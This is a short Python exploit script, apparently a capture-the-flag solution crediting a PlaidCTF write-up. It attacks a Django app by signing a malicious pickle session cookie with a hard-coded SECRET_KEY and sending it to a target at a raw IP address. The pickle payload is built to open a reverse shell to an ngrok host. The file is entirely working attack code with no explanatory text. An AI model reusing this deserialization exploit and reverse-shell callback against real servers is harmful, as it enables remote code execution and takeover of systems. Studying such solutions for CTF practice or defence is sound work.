# o7 https://fail0verflow.com/blog/2014/plaidctf2014-web200-reeekeeeeee/
from utils.ctf.rev_shell import PickleRCE, pickle_rev_shell, rev_shell
import pickle
import requests
import django.core.signing as signing
from django.contrib.sessions.serializers import PickleSerializer
salt = "django.contrib.sessions.backends.signed_cookies"

SECRET_KEY = 'wr`BQcZHs4~}EyU(m]`F_SL^BjnkH7"(S3xv,{sp)Xaqg?2pj2=hFCgN"CR"UPn4'
addr = "http://193.57.159.27:43512/"
#SECRET_KEY = 'django-insecure-ccl^w$g=w#j_6gsiy^921q#eotiyd+o9xqni1cndz=k^a@pm+8'
#addr = "http://127.0.0.1:8000/"
s = signing.dumps(
	PickleRCE(rev_shell("6.tcp.ngrok.io", 17391, "python")),
	key=SECRET_KEY,
	salt=salt,
	serializer=PickleSerializer
)
requests.get(addr, cookies={'sessionid': s})
